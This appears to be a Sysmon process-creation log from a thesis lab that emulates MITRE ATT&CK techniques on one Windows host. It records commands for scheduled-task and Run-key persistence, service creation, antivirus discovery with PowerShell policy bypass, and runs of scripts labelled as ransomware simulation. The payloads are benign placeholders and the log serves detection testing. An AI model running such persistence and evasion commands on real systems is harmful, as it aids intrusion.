2026-06-24T12:51:16.029Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:18.149Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /query /tn "TFM-TEC-003" /v /fo list	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.462Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.499Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /run /tn "TFM-TEC-003"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.653Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:22.687Z	P2	TEC-003	T1053.005		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /delete /tn "TFM-TEC-003" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.906Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:33.952Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.343Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:36.377Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.772Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:38.812Z	P2	TEC-004	T1547.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	reg.exe delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "TFM_T1547_001_test" /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:54.291Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe qc "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.186Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe start "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.216Z	P2	TEC-005	T1569.002		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe start "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:00.085Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:00.122Z	P2	TEC-005	T1569.002		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:54.291Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe qc "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.186Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe start "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.216Z	P2	TEC-005	T1569.002		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe start "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:00.085Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:00.122Z	P2	TEC-005	T1569.002		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe delete "TFM TEC005 Test Service"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P2	TEC-006	T1518.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P2	TEC-006	T1518.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.300Z	P2	TEC-006	T1518.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.725Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.764Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:19.812Z	P2	TEC-006	T1518.001		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName,productState	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:53:00.640Z	P2	TEC-002	T1059.003		Forensic_EVENT_Sysmon_ID1_Process_By_Technique	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\Forensic_EVENT_Sysmon_ID1_Process_By_Technique-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
